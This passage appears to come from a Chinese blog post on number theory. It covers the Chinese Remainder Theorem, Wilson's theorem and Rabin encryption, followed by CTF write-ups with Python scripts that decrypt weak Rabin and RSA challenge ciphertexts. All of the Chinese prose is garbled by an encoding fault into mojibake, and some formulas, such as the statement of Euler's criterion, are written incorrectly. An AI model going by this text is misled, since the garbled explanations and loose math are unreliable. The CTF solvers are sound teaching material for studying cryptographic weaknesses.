+ b + c$</p><p>$x\equiv 2\pmod{7}  \equiv  a + b + c$</p><p>a  b  c éƒ½æ±‚å‡ºæ¥ä¹‹åï¼Œå¯ä»¥åˆ©ç”¨åŒä½™çš„åŠ æ€§ </p><p>$x = a + b + c = 128$æ˜¯ä¸€ä¸ªè§£ï¼Œ  $x = 128 + 105t $åœ¨é€‚å½“è°ƒæ•´$t$ä¹‹åå°±å¯ä»¥æ±‚å‡º$x$åœ¨ä»»ä½•èŒƒå›´å†…çš„è§£ï¼Œæ¯”å¦‚è¯´æ±‚æœ€å°æ­£æ•´æ•°è§£ï¼Œè¿™æ—¶å€™$t$å–$-1$ï¼Œå¾—$x=23$</p><p>åˆ©ç”¨åŒä½™çš„ä¹˜æ€§ï¼š</p><p>ä¹‹å‰ä»¤$x = a + b + c$,ç”¨åŒä½™çš„ä¹˜æ€§ä¹‹å$x = 2aâ€™ + 3bâ€™ + 2câ€™$    (æ­¤æ—¶ä»¤$aâ€™=bâ€™=câ€™=1$ï¼Œå°±ç›¸å½“äºåŒä½™çš„åŠ æ€§äº†)</p><p>$aâ€™\equiv 1\pmod{3} $</p><p>$aâ€™\equiv 0\pmod{5}$</p><p>$aâ€™\equiv 0\pmod{7}$</p><p>$ =&gt;aâ€™=35p$(å¯ä»¥çœ‹åˆ°på–2çš„æ—¶å€™æ»¡è¶³$aâ€™\equiv 1\pmod{3}$,å³$aâ€™=70$)</p><p>æ¥ä¸‹æ¥è¦æ±‚bâ€™ï¼š</p><p>$bâ€™\equiv 0\pmod{3}$</p><p>$bâ€™\equiv 1\pmod{5}$</p><p>$bâ€™\equiv 0\pmod{7}$</p><p>$=&gt;bâ€™=21q$(å¯ä»¥çœ‹åˆ°$q$å–1çš„æ—¶å€™æ»¡è¶³$bâ€™\equiv 1\pmod{5}$,å³$bâ€™=21$)</p><p>ç°åœ¨æ¥çœ‹câ€™</p><p>$câ€™\equiv 0\pmod{3}$</p><p>$câ€™\equiv 0\pmod{5} $</p><p>$câ€™\equiv 1\pmod{7}$</p><p>$=&gt;câ€™=15m$(å¯ä»¥çœ‹åˆ°må–1çš„æ—¶å€™æ»¡è¶³$câ€™\equiv 1\pmod{7}$,å³$câ€™=15$)</p><p>æœ‰äº†$aâ€™ bâ€™ câ€™$ä¹‹åå°±å¯ä»¥å¾—åˆ° $x = 2aâ€™ + 3bâ€™ + 2*câ€™ $<br>ä»£å…¥$aâ€™ bâ€™ câ€™$ä¹‹åå°±å¯ä»¥å¾—åˆ°$x$çš„ä¸€ä¸ªè§£åŠå…¶é€šè§£</p><p>$x = 2<em>70 + 3</em>21 +2*15 $</p><p>$x = 233 + 105t$</p><p>åœ¨çŸ¥é“åŒä½™çš„åŠ æ€§å’Œä¹˜æ€§ä¹‹åå†çœ‹ä¸‹é¢è¿™ä¸ªå…¬å¼å°±æ²¡æœ‰ä»€ä¹ˆé—®é¢˜äº†</p><p>$x \equiv (a_1M_1M_1^{-1} + a_2M_2M_2^{-1} + â€¦ + a_kM_kM_k^{-1}) \mod M$</p><p>å…¶ä¸­ï¼Œ$a_i$å°±æ˜¯é¢˜ç›®æ‰€è¦æ±‚çš„å‰©ä½™ï¼Œ$M_1$å°±æ˜¯å‰æ–‡æåˆ°çš„æ ‡è®°å–æ³•<strong>FLAG</strong>ï¼Œè€Œ$M_1^{-1}$å°±æ˜¯åœ¨åŒä½™çš„ä¹˜æ³•æ€§ä¸­ä¸ºäº†æ»¡è¶³$a_1â€™\equiv 1 \pmod{m_i}$</p><h2 id="å¨å°”é€Šå®šç†"><a href="#å¨å°”é€Šå®šç†" class="headerlink" title="å¨å°”é€Šå®šç†"></a>å¨å°”é€Šå®šç†</h2><p>å½“ä¸”ä»…å½“pä¸ºç´ æ•°æ—¶æœ‰ï¼Œ</p><p> <strong>$(pâˆ’1) ! \equiv  âˆ’1\pmod{p}$</strong></p><h3 id="è¯æ˜ï¼š"><a href="#è¯æ˜ï¼š" class="headerlink" title="è¯æ˜ï¼š"></a>è¯æ˜ï¼š</h3><p>é¦–å…ˆï¼š</p><p>$pâˆ’1 \equiv  âˆ’1\pmod{p}$</p><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦è¯æ˜ $(pâˆ’2)!\equiv 1\pmod{p} $</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œé™¤å» $1$ åï¼Œå¦‚æœ $2,3,â€¦,pâˆ’2$ èƒ½å¤Ÿä¸¤ä¸¤é…å¯¹ï¼Œä¸”æ¯å¯¹æ•°ä¹˜ç§¯æ¨¡ $p$ åä¸º $1$ çš„è¯ï¼Œå¨å°”é€Šå®šç†å°±æˆç«‹äº†ï¼Œç„¶åæˆ‘ä»¬è€ƒè™‘è¿™å…¶å®å°±æ˜¯å¯¹äº$ 2,3,â€¦,pâˆ’2$å»æ‰¾ æ¨¡ $p$ æ„ä¹‰ä¸‹çš„é€†å…ƒã€‚</p><p>ç„¶åè€ƒè™‘ä¸€ä¸‹äºŒæ¬¡å‰©ä½™é‡Œé¢çš„è¡ç”ŸçŸ¥è¯†ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“å¯¹äº $x^2\equiv 1\pmod{p}$åªæœ‰ä¸¤ä¸ªè§£$ï¼ˆ1ï¼Œp-1ï¼‰$ï¼Œè€Œè¿™ä¸¤ä¸ªæ•°å·²ç»è¢«æˆ‘ä»¬å®‰æ’æ‰äº†ï¼Œä¹Ÿå°±æ˜¯è¯´ $2,3,â€¦,pâˆ’2$ä¸­ä¸å­˜åœ¨æŸä¸ªæ•°çš„é€†å…ƒæ˜¯è‡ªå·±æœ¬èº«ã€‚</p><p>ç„¶å é›†åˆ$ A={1,2,3,â€¦p -1}$;  æ„æˆæ¨¡pä¹˜æ³•çš„ç¼©ç³»ï¼Œå³ä»»æ„$iâˆˆA$ ,å­˜åœ¨$jâˆˆA$,ä½¿å¾—:     $( iï¼Œj ) \equiv  1\pmod{p}$</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œé™¤å»$1$å’Œ$p-1$å¤–ï¼Œå…¶ä½™çš„ä¸¤ä¸¤é…å¯¹äº’ä¸ºé€†å…ƒ</p><p>è¯æ¯•</p><h2 id="åº”ç”¨ï¼šRabinç®—æ³•"><a href="#åº”ç”¨ï¼šRabinç®—æ³•" class="headerlink" title="åº”ç”¨ï¼šRabinç®—æ³•"></a>åº”ç”¨ï¼šRabinç®—æ³•</h2><p>åœ¨è§£Rabinç®—æ³•å‰ï¼Œæˆ‘ä»¬éœ€è¦ä¸€äº›å®šç†ã€æ¨è®º</p><h3 id="å®šç†1"><a href="#å®šç†1" class="headerlink" title="å®šç†1"></a>å®šç†1</h3><p>æ¬§æ‹‰åˆ¤åˆ«å®šç†ï¼Œ cæ˜¯æ¨¡pçš„å¹³æ–¹å‰©ä½™çš„å……è¦æ¡ä»¶æ˜¯ ï¼Œ$(c^\frac{1}{2})^{Ï†(n)}  \equiv  1\pmod{p}$</p><h4 id="è¯æ˜ï¼š-1"><a href="#è¯æ˜ï¼š-1" class="headerlink" title="è¯æ˜ï¼š"></a>è¯æ˜ï¼š</h4><p>é¦–å…ˆï¼Œç”±äº$p$æ˜¯ä¸€ä¸ªå¥‡ç´ æ•°ï¼Œç”±è´¹é©¬å°å®šç†ï¼Œ$d^{p-1} \equiv 1 \pmod{p}$ã€‚ä½†æ˜¯$P-1$æ˜¯ä¸€ä¸ªå¶æ•°ï¼Œæ‰€ä»¥æœ‰</p><p>$(d^{ \frac{p-1}{2} } -1) \cdot (d^{ \frac{p-1}{2} }+1) \equiv 0 \pmod{p}$</p><p>$p$ æ˜¯ä¸€ä¸ªç´ æ•°ï¼Œæ‰€ä»¥$d^{ \frac{p-1}{2} } -1$ å’Œ $d^{ \frac{p-1}{2} }+1$ä¸­å¿…æœ‰ä¸€ä¸ªæ˜¯$P$ çš„å€æ•°ã€‚å› æ­¤$d^{ \frac{p-1}{2} }$æ¨¡$P$çš„ä½™æ•°å¿…ç„¶æ˜¯1æˆ–-1ã€‚</p><ul><li>è¯æ˜è‹¥$d$æ˜¯æ¨¡$p$äºŒæ¬¡å‰©ä½™ï¼Œåˆ™$d^{ \frac{p-1}{2}} \equiv 1 \pmod{p}$</li></ul><p>è‹¥$d$æ˜¯æ¨¡$p$äºŒæ¬¡å‰©ä½™ï¼Œåˆ™å­˜åœ¨ $x^2 \equiv d \pmod{p}$ï¼Œ$p$è·Ÿ$d$å’Œ$x$ äº’è´¨ã€‚æ ¹æ®è´¹é©¬å°å®šç†å¾—ï¼š</p><p>$d^{ \frac{p-1}{2}} \equiv x^{p-1} \equiv 1 \pmod{p}$</p><ul><li>è¯æ˜è‹¥$d^{ \frac{p-1}{2} } \equiv 1 \pmod{p}$ï¼Œåˆ™$d$æ˜¯æ¨¡$p$çš„äºŒæ¬¡å‰©ä½™</li></ul><p>$p$ æ˜¯ä¸€ä¸ªå¥‡ç´ æ•°ï¼Œæ‰€ä»¥å…³äº$p$çš„åŸæ ¹å­˜åœ¨ã€‚è®¾$a$æ˜¯$p$çš„ä¸€ä¸ªåŸæ ¹ï¼Œåˆ™å­˜åœ¨$1 \le j \le p-1$ä½¿å¾—$d=a^j$ã€‚äºæ˜¯</p><p> $d^{ \frac{p-1}{2}} \equiv x^{p-1} \equiv 1 \pmod{p}$ </p><p>$a$æ˜¯$p$çš„ä¸€ä¸ªåŸæ ¹ï¼Œå› æ­¤$a$æ¨¡$p$çš„æŒ‡æ•°æ˜¯$p-1$ï¼Œäºæ˜¯$p-1$æ•´é™¤ $\frac{ j(p-1) }{2}$ ã€‚è¿™è¯´æ˜$j$æ˜¯ä¸€ä¸ªå¶æ•°ã€‚ä»¤ $i = \frac{j}{2}$ ï¼Œå°±æœ‰ $(a^i)^2 =a^{2i} = d$ ã€‚$d$æ˜¯æ¨¡$p$ çš„äºŒæ¬¡å‰©ä½™ </p><h3 id="å®šç†2"><a href="#å®šç†2" class="headerlink" title="å®šç†2"></a>å®šç†2</h3><p>äºŒæ¬¡åŒä½™å¼$x^2 \equiv  c \pmod{p}$çš„è§£ä¸ºï¼š</p><p>â€‹                                                $    x \equiv  Â±c^\frac{p+1}{4}  \pmod{p}    $</p><h4 id="è¯æ˜-2"><a href="#è¯æ˜-2" class="headerlink" title="è¯æ˜"></a>è¯æ˜</h4><p>ç”±äºpæ˜¯ç´ æ•°ï¼Œæ˜¾ç„¶aä¸päº’ç´ ï¼Œå†ç”±æ¬§æ‹‰åˆ¤åˆ«å®šç†ï¼Œ aæ˜¯æ¨¡pçš„å¹³æ–¹å‰©ä½™çš„å……è¦æ¡ä»¶æ˜¯ ï¼Œ</p><p>$(c^\frac{1}{2})^{Ï†(n)} \equiv  1\pmod{p}$</p><p>å³$(c^\frac{1}{2})^{p-1} \equiv  1\pmod{p}$</p><p>å¸¦å…¥åŸå¼ï¼Œå¾—$x^2 \equiv  cÂ·(c^\frac{1}{2})^{p-1} \equiv  c^\frac{p+1}{2} \equiv  (c^\frac{p+1}{4})^2$</p><p>åˆ™</p><p>$x \equiv  Â±c^\frac{p+1}{4}  \pmod{p}$</p><h3 id="å®šç†3"><a href="#å®šç†3" class="headerlink" title="å®šç†3"></a>å®šç†3</h3><p>å¦‚æœæ•´æ•°$c$æ»¡è¶³ï¼š</p><p>1ï¼‰ $c$ä¸º$p$çš„å¹³æ–¹å‰©ä½™</p><p>2ï¼‰ $c$ä¸º$q$çš„å¹³æ–¹å‰©ä½™</p><p>åˆ™ï¼š$ c$ä¸º$p*q$çš„å¹³æ–¹å‰©ä½™ï¼Œè§£$x$ä¸ºï¼š</p><p>$x\equivÂ±(c^\frac{p+1}{4}\pmod{p})\cdot(q^{-1}\pmod{p})\cdot q Â± (c^\frac{q+1}{4}\pmod{q})\cdot (p^{-1}\pmod{q})Â·p\pmod{p\cdot q}$</p><h4 id="è¯æ˜-3"><a href="#è¯æ˜-3" class="headerlink" title="è¯æ˜"></a>è¯æ˜</h4><p>äºŒæ¬¡åŒä½™å¼ï¼š    $x^2 \equiv  c\pmod{p*q}$</p><p>ç­‰ä»·äºåŒä½™å¼ç»„ ï¼š    $x^2 \equiv  c \pmod{p}$        â‘     </p><p>â€‹                                    $x^2 \equiv  c\pmod{q}$        â‘¡</p><p>ç”±å®šç†2</p><p>â‘ å¼è§£ä¸º    $x \equiv  Â±c^\frac{p+1}{4}  \pmod{p}    $</p><p>â‘¡å¼è§£ä¸º    $x \equiv  Â±c^\frac{q+1}{4}  \pmod{q}$</p><p>ç”±CRTï¼Œè§£ä¸º $x\equivÂ±(c^\frac{p+1}{4}\pmod{p})\cdot(q^{-1}\pmod{p})\cdot q Â± (c^\frac{q+1}{4}\pmod{q})\cdot (p^{-1}\pmod{q})Â·p\pmod{p\cdot q}$</p><h3 id="RabinåŠ å¯†"><a href="#RabinåŠ å¯†" class="headerlink" title="RabinåŠ å¯†"></a>RabinåŠ å¯†</h3><p>é€‰æ‹©ä¸¤ä¸ªå¤§ç´ æ•°$p$å’Œ$q$åšä¸ºç§é’¥</p><p>è®¡ç®—$n = p * q$åšä¸ºå…¬é’¥</p><p>è‹¥æ˜æ–‡ä¸ºmï¼Œåˆ™å¯†æ–‡ä¸º$c \equiv  m^2 \pmod{n}$</p><h3 id="Rabinè§£å¯†"><a href="#Rabinè§£å¯†" class="headerlink" title="Rabinè§£å¯†"></a>Rabinè§£å¯†</h3><p>æˆ‘ä»¬é¦–å…ˆè®¡ç®—å‡ºx1å’Œx2ï¼Œä½¿å¾—</p><p>$x_1^2 \equiv  c \pmod{p}$ï¼Œâ‘ </p><p>$x_2^2 \equiv  c \pmod q)$ï¼Œâ‘¡</p><h4 id="i-på’Œqéƒ½æ˜¯æ¨¡4ä½™3çš„æ•°"><a href="#i-på’Œqéƒ½æ˜¯æ¨¡4ä½™3çš„æ•°" class="headerlink" title="i)på’Œqéƒ½æ˜¯æ¨¡4ä½™3çš„æ•°"></a>i)på’Œqéƒ½æ˜¯æ¨¡4ä½™3çš„æ•°</h4><p>ç”±äº$p$æ˜¯ç´ æ•°ï¼Œæ˜¾ç„¶$c$ä¸$p$äº’ç´ ï¼Œå†ç”±å®šç†2</p><p>å¾—   </p><p>$x_1 \equiv  Â±c^\frac{p+1}{4}  \pmod{p}$</p><p>$x_2 \equiv  Â±c^\frac{q+1}{4}  \pmod{q}$</p><p>ï¼ˆä¸€æ­£ä¸€è´Ÿï¼Œè´Ÿçš„è®¡ç®—å¯ç®€åŒ–ä¸º æ¨¡-æ­£ï¼Œå¦‚ï¼š$-x_1 \equiv  p - x_1  \pmod{p}$ï¼‰</p><p>ä»è¿™é‡Œå¯ä»¥çœ‹å‡ºæ¥å¦‚æœ$p$å’Œ$q$ä¸æ˜¯æ¨¡$4$ä½™$3$çš„è¯ï¼Œcçš„æŒ‡æ•°å°±ä¸æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œä¹Ÿå°±ä¸èƒ½ç”¨è¿™ä¸ªæ–¹æ³•è®¡ç®—äº†</p><p>æ¥ç€æˆ‘ä»¬æ±‚å‡º$p$åœ¨æ¨¡$q$ä¸‹çš„é€†ï¼Œè®¾ä¸º$a$ï¼Œå³$a*p \equiv  1\pmod{q}$</p><p>ç„¶åæˆ‘ä»¬æ±‚å‡º$q$åœ¨æ¨¡$p$ä¸‹çš„é€†ï¼Œè®¾ä¸º$b$ï¼Œå³$b*q \equiv  1 \pmod{p}$</p><p>æ±‚å‡ºæ¥aï¼Œbç”¨äºä¸­å›½å‰©ä½™å®šç†</p><p>å¸¦å…¥ $x\equivÂ±(c^\frac{p+1}{4}\pmod{p})\cdot(q^{-1}\pmod{p})\cdot q Â± (c^\frac{q+1}{4}\pmod{q})\cdot (p^{-1}\pmod{q})Â·p\pmod{p\cdot q}$</p><p>å¾—    $x \equivÂ±(c^\frac{p+1}{4}\pmod{p})Â·b\cdot q Â±(c^\frac{q+1}{4}\pmod{q})\cdot aÂ·p   \pmod{n}$</p><p>è®¾$c^\frac{p+1}{4}\pmod{p} $ä¸º$cp$ï¼Œ$c^\frac{q+1}{4} \pmod{q}$ä¸º$cq$</p><p>$x_1 = (b \cdot q \cdot c_p+a \cdot p \cdot c_q )  \mod n$<br>$-x_1 = n - x_1$<br>$x_2= (b \cdot q \cdot c_p- a \cdot p \cdot c_q)  \mod n$<br>$-x_2 = n - x_2$</p><p>å…¶ä¸­æœ‰ä¸€ä¸ªä¸ºæˆ‘ä»¬æƒ³è¦çš„æ˜æ–‡mã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2s</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hex(x)[<span class="number">2</span>:].decode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">c = </span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">n = p*q</span><br><span class="line">c_p = pow(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">c_q = pow(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">a = gmpy2.invert(p,q)</span><br><span class="line">b = gmpy2.invert(q,p)</span><br><span class="line">x = (b*q*c_p+a*p*c_q)%n</span><br><span class="line">y = (b*q*c_p-a*p*c_q)%n</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> n2s(x)</span><br><span class="line"><span class="keyword">print</span> n2s(n-x)</span><br><span class="line"><span class="keyword">print</span> n2s(y)</span><br><span class="line"><span class="keyword">print</span> n2s(n-y)</span><br></pre></td></tr></table></figure><h4 id="ii-på’Œqä¸æ˜¯æ¨¡4ä½™3çš„æ•°"><a href="#ii-på’Œqä¸æ˜¯æ¨¡4ä½™3çš„æ•°" class="headerlink" title="ii)på’Œqä¸æ˜¯æ¨¡4ä½™3çš„æ•°"></a>ii)på’Œqä¸æ˜¯æ¨¡4ä½™3çš„æ•°</h4><p>è¿™é‡Œæ¶‰åŠ <a href="https://en.wikipedia.org/wiki/Cipolla's_algorithm" target="_blank" rel="noopener">Cipollaâ€™s algorithm</a> ï¼Œ<a href="https://xz.aliyun.com/t/5113#toc-4" target="_blank" rel="noopener">å…ˆçŸ¥</a>å·²ç»æœ‰ä¸€ç¯‡è®²çš„ä¸é”™çš„æ–‡ç« äº† </p><h2 id="é¢˜ç›®å®ä¾‹"><a href="#é¢˜ç›®å®ä¾‹" class="headerlink" title="é¢˜ç›®å®ä¾‹"></a>é¢˜ç›®å®ä¾‹</h2><h3 id="UNCTF-ä¸€å¥è¯åŠ å¯†"><a href="#UNCTF-ä¸€å¥è¯åŠ å¯†" class="headerlink" title="UNCTF - ä¸€å¥è¯åŠ å¯†"></a>UNCTF - ä¸€å¥è¯åŠ å¯†</h3><p>é¢˜ç›®æ˜¯ç»™äº†ä¸€å¼ å›¾ï¼Œéšå†™äº†ä¸€ä¸ªæ¨¡n</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">n</span> = <span class="number">0</span>xc2636ae5c3d8e43ffb97ab09028f1aac6c0bf6cd3d70ebca281bffe97fbe30dd</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°nä¸å¤§ï¼Œç›´æ¥ç”¨yafuåˆ†è§£å¯å¾—</p><p><img src="https://i.loli.net/2020/04/30/542OKV3mC7N1PcM.png" alt="UNCTF - ä¸€å¥è¯åŠ å¯†"></p><p>ä½†æ˜¯æ‰¾ä¸åˆ°eï¼Œæœ€åè¯•äº†è¯•rabinï¼ŒæˆåŠŸç ´è§£</p><p>expç”¨ä¸Šé¢çš„é‚£ä¸ªå°±å¯</p><h3 id="roarctf-babyrsa"><a href="#roarctf-babyrsa" class="headerlink" title="roarctf - babyrsa"></a>roarctf - babyrsa</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import sympy</span><br><span class="line">import random</span><br><span class="line">def myGetPrime():</span><br><span class="line">    A= getPrime(513)</span><br><span class="line">    <span class="builtin-name">print</span>(A)</span><br><span class="line">    <span class="attribute">B</span>=A-random.randint(1e3,1e5)</span><br><span class="line">    <span class="builtin-name">print</span>(B)</span><br><span class="line">    return sympy.nextPrime((B!)%A)</span><br><span class="line"><span class="attribute">p</span>=myGetPrime()</span><br><span class="line"><span class="comment">#A1=</span></span><br><span class="line"><span class="comment">#B1=</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">q</span>=myGetPrime()</span><br><span class="line"><span class="comment">#A2=</span></span><br><span class="line"><span class="comment">#B2=</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">r</span>=myGetPrime()</span><br><span class="line"><span class="attribute">n</span>=p*q*r</span><br><span class="line"><span class="comment">#n=</span></span><br><span class="line"><span class="attribute">c</span>=pow(flag,e,n)</span><br><span class="line"><span class="comment">#e=0x1001</span></span><br><span class="line"><span class="comment">#c=</span></span><br><span class="line"><span class="comment">#so,what is the flag?</span></span><br></pre></td></tr></table></figure><p>åŠ å¯†ä¸­çš„<strong>(B!)%A</strong>çš„ <strong>!</strong> åœ¨è¿™é‡Œæ˜¯é˜¶ä¹˜çš„æ„æ€ï¼Œæ‰€ä»¥æ˜¾ç„¶è¿™é‡Œè¦ç”¨åˆ°å¨å°”é€Šå®šç†ï¼Œä¸ç„¶è¿™ä¹ˆå¤§çš„ä¸€ä¸ªæ•°çš„é˜¶ä¹˜ï¼Œæ ¹æœ¬åƒä¸æ¶ˆå¥½å§</p><p>æ ¹æ®åŠ å¯†é€»è¾‘ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªä¸‰ç´ æ•°ç³»ç»Ÿï¼Œæ‰€ä»¥$Ï†(n) = (p-1)<em>(q-1)</em>(r-1)$ï¼Œç„¶å$r$è‚¯å®šæ˜¯è¦é€šè¿‡å…ˆæ±‚å‡º$pï¼Œq$æ¥å¾—å‡º</p><p>ç„¶åå…³äº$p$å’Œ$q$ï¼Œé¢˜ç›®ç»™çš„ä¿¡æ¯éƒ½ä¸€æ ·ï¼Œæ‰€ä»¥æ±‚$p$å’Œæ±‚qçš„è§£æ³•è‚¯å®šæ˜¯ä¸€æ ·çš„ï¼Œ</p><p>æ‰€ä»¥é¢˜ç›®ç®€åŒ–ä¸ºï¼Œ<strong>æ ¹æ®A1,B1è§£p</strong></p><p>è€Œ$p \equiv (B!)  \pmod{A}$ ï¼ˆBæ˜¯ä¸€ä¸ªæ¯”Aå°çš„æ•°ï¼‰</p><p>è™½ç„¶Aï¼ŒBå‡å·²ç»™å‡ºä¸”äº’ç´ ï¼Œä½†æ˜¾ç„¶å¤§æ•°$B$çš„é˜¶ä¹˜æ˜¯ä¸å¯èƒ½ç›´æ¥æ±‚å¾—çš„ï¼Œ</p><p>æ‰€ä»¥è¦ç”¨å¨å°”é€Šå®šç†ç®€åŒ–è®¡ç®—</p><p>ç®€åŒ–è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>å·²çŸ¥ $B! \equiv  P\pmod{A})$</p><p>ç”±äºAæ˜¯ç´ æ•°ï¼Œæ‰€ä»¥æœ‰ï¼š        $(A-1)! \equiv  -1 \pmod{A}$</p><p>â€‹                   å³$(A-1)(A-2)â€¦â€¦(B+1)B! \equiv  -1 \pmod{A}$</p><p>â€‹         æ ¹æ®å·²çŸ¥$(A-1)(A-2)â€¦â€¦(B+1)P \equiv  -1 \pmod{A}$</p><p>â€‹                     å˜å½¢ä¸º$(A-2)â€¦â€¦(B+1)P \equiv  1 \pmod{A}$</p><p>æ‰€ä»¥$p$å³ä¸º$(A-2)(A-3)â€¦â€¦(B+1)$ åœ¨æ¨¡$A $ä¸‹çš„é€†</p><p>exp</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line">import sympy</span><br><span class="line"></span><br><span class="line">A1=</span><br><span class="line">B1=</span><br><span class="line">A2=</span><br><span class="line">B2=</span><br><span class="line">n=</span><br><span class="line">e=0x1001</span><br><span class="line">c=</span><br><span class="line"></span><br><span class="line">a = 1</span><br><span class="line">for i in range(A1-2,B1,-1):</span><br><span class="line">    a = a*i % A1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b = 1</span><br><span class="line">for i in range(A2-2,B2,-1):</span><br><span class="line">    b = b*i % A2</span><br><span class="line">    </span><br><span class="line">p = sympy.nextprime(invert(a,A1))</span><br><span class="line">q = sympy.nextprime(invert(b,A2))</span><br><span class="line">r=n/p/q</span><br><span class="line">phi = (p-1)*(q-1)*(r-1)</span><br><span class="line">d = invert(e,phi)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print hex(m)[2:].decode('hex')</span><br></pre></td></tr></table></figure><h3 id="HECTF-easy-rsa"><a href="#HECTF-easy-rsa" class="headerlink" title="HECTF - easy_rsa"></a>HECTF - easy_rsa</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">from Crypto.Util import number</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#e = have a try</span></span><br><span class="line">p = number.getPrime(1024)</span><br><span class="line"></span><br><span class="line">q = number.getPrime(1024)</span><br><span class="line"></span><br><span class="line">nothing = 251560377963038761190200797029988859033 <span class="comment"># getPrime(128)</span></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">fn = (p-1)*(q-1)</span><br><span class="line">d =inverse(e, fn)</span><br><span class="line">something=(p-1)*d+nothing</span><br><span class="line">enc = pow(flag, e, p*q)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n=</span></span><br><span class="line"><span class="comment">#something=</span></span><br><span class="line"><span class="comment">#enc=</span></span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç»™äº†ï¼Œnothingï¼ˆä¸‹é¢è®°ä¸ºrï¼‰ï¼Œsomethingï¼ˆä¸‹é¢è®°ä¸ºsï¼‰ï¼Œå…¶ä¸­$ (p-1)*d= s - r$</p><p>ç›®çš„å¾ˆæ˜ç¡®ï¼Œå°±æ˜¯åˆ†è§£å¤§æ•°n</p><p>è¿™ä¸€é¢˜çš„æ€è·¯å°±æ˜¯åˆ©ç”¨$GCD$æ¥çº¦å‡º$n$çš„å› å­</p><p>æ‰€ä»¥é¦–å…ˆè¦è·å¾—ä¸€ä¸ª$p$çš„å€æ•°</p><p>æ ¹æ®è´¹é©¬å°å®šç†</p><p>$2^{p-1} \equiv  1 \pmod{p}$æ˜¾ç„¶æˆç«‹    (ä¸»è¦æ˜¯ä¸ºäº†åˆ©ç”¨é¢˜ç›®ä¸­ç»™å‡ºçš„$ (p-1)*d$ï¼‰</p><p>æ‰€ä»¥è®¾$A = 2^{p-1} - 1 = kp$</p><p>ç„¶ååˆ©ç”¨æ¬§æ‹‰å®šç†ï¼Œæˆ‘ä»¬ç›´æ¥åˆ©ç”¨ä¸Šæ–‡ä¸­æåˆ°çš„RSAçš„è§£å¯†è¯æ˜ä¸­çš„ç»“è®º</p><p><img src="https://i.loli.net/2020/04/30/1mkjEzZBHAdD2bW.png" alt="æ¬§æ‹‰å®šç†"></p><p>$(2^{p-1})^{ed}  \equiv  (2^{p-1})   \pmod{n}$</p><p>ç”±é¢˜ï¼Œ$(p-1)d = s - r$</p><p>æ‰€ä»¥$A  \equiv  2^{p-1} - 1  \equiv   (2^{p-1})^{ed} - 1 \equiv   2^{es-er} - 1    \pmod{n}$</p><p>æ‰€ä»¥  $gcd( 2^{es-er} - 1 , n) $</p><p>å³      $gcd(kp , pq) $</p><p>å³å¯å¾—åˆ°     